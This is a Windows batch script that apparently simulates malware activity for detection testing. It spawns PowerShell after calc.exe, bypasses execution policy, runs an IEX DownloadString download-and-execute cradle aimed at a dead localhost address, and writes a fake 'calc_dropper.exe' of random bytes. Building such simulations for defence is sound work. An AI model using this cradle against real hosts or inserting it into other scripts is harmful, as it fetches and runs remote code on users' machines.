@echo off
REM Unusual spawn: calc.exe -> powershell.exe
set "PS_CMD=%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe"
if exist "%SystemRoot%\Sysnative\WindowsPowerShell\v1.0\powershell.exe" set "PS_CMD=%SystemRoot%\Sysnative\WindowsPowerShell\v1.0\powershell.exe"
if not exist "%PS_CMD%" (
	echo ERROR: PowerShell not found.
	pause
	exit /b 1
)


echo ============================================
echo Unusual Parent: calc.exe -> powershell.exe
echo ============================================
echo.

echo [*] Stage 1: Starting calc (unusual parent process)
start /B calc.exe
timeout /t 1 /nobreak >nul

echo [*] Stage 2: PowerShell spawned from calc context with download cradle
"%PS_CMD%" -NoProfile -ExecutionPolicy Bypass -Command "Write-Host '[SIM] Unusual parent: calc.exe -> powershell.exe'; Write-Host '[SIM] IEX DownloadString pattern (safe)'; try { IEX (New-Object Net.WebClient).DownloadString('http://127.0.0.1:1/payload') } catch { Write-Host '[SIM] Download failed as expected' }"

echo [*] Stage 3: Dropping payload
"%PS_CMD%" -NoProfile -ExecutionPolicy Bypass -Command "$bytes = [byte[]]::new(8192); $rng = [System.Security.Cryptography.RandomNumberGenerator]::Create(); $rng.GetBytes($bytes); [System.IO.File]::WriteAllBytes(\"$env:PUBLIC\calc_dropper.exe\", $bytes); Write-Host '[SIM] Payload dropped'"

echo.
echo ============================================
echo SIMULATION COMPLETE
echo ============================================
